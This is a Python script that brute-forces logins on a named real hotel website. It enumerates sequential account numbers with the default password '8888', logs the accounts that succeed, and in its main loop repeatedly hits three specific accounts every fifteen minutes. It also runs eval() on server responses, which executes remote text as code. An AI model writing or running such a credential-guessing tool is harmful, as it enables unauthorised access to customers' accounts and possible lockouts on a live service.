# -*- coding:utf-8 -*- 
from requests import request
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
import requests
import json
import time
username_prefix = 8888000

url = "http://www.kaiyuanhotels.com/web/index/login.htm"
payload = {'userName':'0','password':'8888'}
account_start = 888800052000

def auth_account(account, password ='8888', faield_test_again = True):
    print('开始')
    payload = {'userName': '0', 'password': '8888'}
    dict.update(payload, userName= str(account))
    dict.update(payload,password = str(password))
    payload.update()
    try:
        r = requests.get(url,payload)
        if eval(r.text)['statusCode'] == '200':
            print('{}密码正确'.format(account))
            return True
        else:
            print('{}'.format(r.text))
            return False
    except requests.ConnectTimeout:
        if faield_test_again:
            auth_account(account, faield_test_again=False)
    except Exception as e:
        raise e


def spider_kaiyuan(start,end):
    file_name = '账号{0}-{1}.txt'.format(start,end)
    with open(file_name, 'a+') as f:
        for account in range(int(start), int(end)):
            if (auth_account(account=account)):
                f.write(account)

def spide_multi_run_wrapper(args):
    spider_kaiyuan(*args)
def generateCount():
    start = 888800000000
    for count in range(start,888800099999):
        with open('account.txt','a+') as f:
            f.write('{}\n'.format(count))

def generate_func_args(start,end):
    return (start,end)
if __name__ == '__main__':
    accounts = ['888800051396','888800051171','888800051159']
    while True:
        for account in accounts:
            for i in range (6):
                auth_account(account,)
        print('睡眠中')
        time.sleep(60 * 15)







